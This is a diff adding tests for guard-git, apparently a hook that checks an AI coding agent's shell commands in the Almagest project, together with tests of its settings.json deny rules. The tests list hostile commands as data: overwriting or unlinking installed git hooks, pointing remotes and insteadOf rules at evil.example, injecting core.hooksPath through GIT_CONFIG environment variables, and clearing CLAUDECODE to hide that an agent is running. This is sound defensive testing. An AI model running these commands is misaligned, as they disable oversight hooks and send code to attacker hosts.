@@ -301,6 +301,73 @@ describe('guard-git: .git/, hooks config, agent environment', () => {
   });
 });
 
+describe('guard-git: installed hooks, remotes, sign-in links (R2-A, R2-C)', () => {
+  it('blocks writes into <git-common-dir>/almagest/, from the repo and from a linked worktree whose .git is a file', () => {
+    const r = repo();
+    const common = path.join(fs.realpathSync(r), '.git');
+    const wt = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'almagest-wt-')), 'wt');
+    tmp.push(path.dirname(wt));
+    git(r, 'worktree', 'add', '-q', '-b', 'ingest/w-1234567', wt);
+    assert.equal(fs.statSync(path.join(wt, '.git')).isFile(), true);
+    const hook = path.join(common, 'almagest', 'hooks', 'pre-commit');
+    for (const cwd of [r, wt]) {
+      for (const cmd of [`cp evil ${hook}`, `echo x > ${hook}`, `chmod 644 ${hook}`, `chmod -x ${hook}`, `mv ${hook} /tmp/x`,
+        `rm -r ${path.dirname(hook)}`, `ln -sf ${path.join(wt, 'tools/hooks')} ${path.dirname(hook)}`, `tee -a ${hook}`]) {
+        assert.equal(blocks(cwd, cmd), true, `${cwd === r ? 'repo' : 'worktree'}: ${cmd}`);
+      }
+    }
+    assert.equal(blocks(wt, 'chmod +x tools/hooks/pre-commit'), false, 'the tracked copy is not what git runs');
+  });
+
+  it('blocks git config writes to core.hooksPath, almagest.*, includes and remote URLs, and config passed through the environment', () => {
+    const r = repo();
+    for (const cmd of ['git config almagest.hooks /tmp/x', 'git config --unset almagest.main', 'git config set almagest.x y',
+      'git config include.path /tmp/evil.cfg', 'git config includeIf.gitdir:/.path /tmp/evil.cfg', 'git config remote.origin.url https://evil.example/x.git',
+      'git config url.https://evil.example/.insteadOf https://github.com/', 'git config --remove-section core', 'git config --edit',
+      'git -c include.path=/tmp/evil.cfg commit -m x',
+      'GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.hooksPath GIT_CONFIG_VALUE_0=/dev/null git commit -m x',
+      'export GIT_CONFIG_PARAMETERS="\'core.hooksPath\'=\'/dev/null\'"; git commit -m x', 'env GIT_CONFIG_COUNT=1 git commit -m x']) {
+      assert.equal(blocks(r, cmd), true, cmd);
+    }
+    assert.equal(blocks(r, 'git config --get almagest.main'), false, 'reading is fine');
+    assert.equal(blocks(r, 'git config remote.origin.url'), false);
+    assert.equal(blocks(r, 'git config user.email t@t'), false);
+  });
+
+  it('blocks adding a remote or repointing one, and fetching straight from a URL', () => {
+    const r = repo();
+    for (const cmd of ['git remote add evil https://evil.example/x.git', 'git remote set-url origin https://evil.example/x.git',
+      'git remote add evil /tmp/evil && git remote update evil', 'git remote -v add evil x',
+      'git fetch https://evil.example/x.git payload:ingest/z-1111111', 'git pull git@evil.example:x.git payload']) {
+      assert.equal(blocks(r, cmd), true, cmd);
+    }
+    for (const cmd of ['git remote -v', 'git remote', 'git remote show origin', 'git fetch origin', 'git fetch . ingest/x:ingest/y']) {
+      assert.equal(blocks(r, cmd), false, cmd);
+    }
+  });
+
+  it('blocks `almagest login`, and clearing the agent variables before the Almagest CLI or the service', () => {
+    const r = repo();
+    for (const cmd of ['node server/bin/almagest.mjs login me', 'env -u CLAUDECODE node server/bin/almagest.mjs login me',
+      'node server/bin/almagest.mjs --repo . login', 'npx almagest login ada', './node_modules/.bin/almagest login',
+      'bash -c "node server/bin/almagest.mjs login me"', 'node "$CLAUDE_PROJECT_DIR/server/bin/almagest.mjs" login']) {
+      const d = bash(r, cmd);
+      assert.equal(d.block, true, cmd);
+      assert.match(d.reason, /sign-in link/, cmd);
+    }
+    for (const cmd of ['env -u CLAUDECODE node server/bin/almagest.mjs proposals', 'env -i PATH=/usr/bin npm run serve',
+      'unset CLAUDECODE; node server/bin/almagest.mjs serve', 'CLAUDECODE= npx almagest serve', 'env -u AI_AGENT npm serve']) {
+      const d = bash(r, cmd);
+      assert.equal(d.block, true, cmd);
+      assert.match(d.reason, /clears an agent-environment variable/, cmd);
+    }
+    for (const cmd of ['node server/bin/almagest.mjs connectors login github', 'node server/bin/almagest.mjs doctor',
+      'node server/bin/almagest.mjs proposals', 'env -u FOO node server/bin/almagest.mjs doctor', 'npm run serve']) {
+      assert.equal(blocks(r, cmd), false, cmd);
+    }
+  });
+});
+
 describe('.claude/settings.json (finding 5a)', () => {
   const settings = JSON.parse(fs.readFileSync(path.join(SERVICE_ROOT, '..', '.claude', 'settings.json'), 'utf-8'));
   it('does not pre-approve arbitrary node or git push, and denies hook-skipping commands', () => {
@@ -316,6 +383,15 @@ describe('.claude/settings.json (finding 5a)', () => {
       'Bash(git checkout:*)', 'Bash(git switch:*)', 'Bash(curl -s http://localhost:*)']) assert.ok(!allow.includes(a), a);
     for (const d of ['Bash(git checkout -B:*)', 'Bash(git switch -C:*)', 'Bash(git branch -f:*)', 'Bash(git branch -M:*)', 'Bash(git branch -C:*)',
       'Bash(git reset --soft:*)', 'Bash(git reset --mixed:*)', 'Bash(git update-ref:*)', 'Bash(curl *inbox/login*)']) assert.ok(deny.includes(d), d);
+  });
+  it('pre-approves only read-only Almagest subcommands, and no new remotes (R2-A, R2-C)', () => {
+    const { allow, deny } = settings.permissions;
+    assert.ok(!allow.includes('Bash(git remote:*)'));
+    assert.ok(!allow.includes('Bash(node server/bin/almagest.mjs:*)'));
+    const cli = allow.filter((a) => a.startsWith('Bash(node server/bin/almagest.mjs')).map((a) => a.slice('Bash(node server/bin/almagest.mjs '.length).replace(/(:\*)?\)$/, ''));
+    assert.deepEqual(cli.sort(), ['connectors list', 'doctor', 'gaps', 'help', 'hooks check', 'jobs', 'proposals']);
+    for (const d of ['Bash(git remote add:*)', 'Bash(git remote set-url:*)', 'Bash(node server/bin/almagest.mjs login:*)',
+      'Bash(node server/bin/almagest.mjs hooks install:*)']) assert.ok(deny.includes(d), d);
   });
   it('wires guard-git on Bash and guard-wiki on file edits', () => {
     const pre = settings.hooks.PreToolUse;
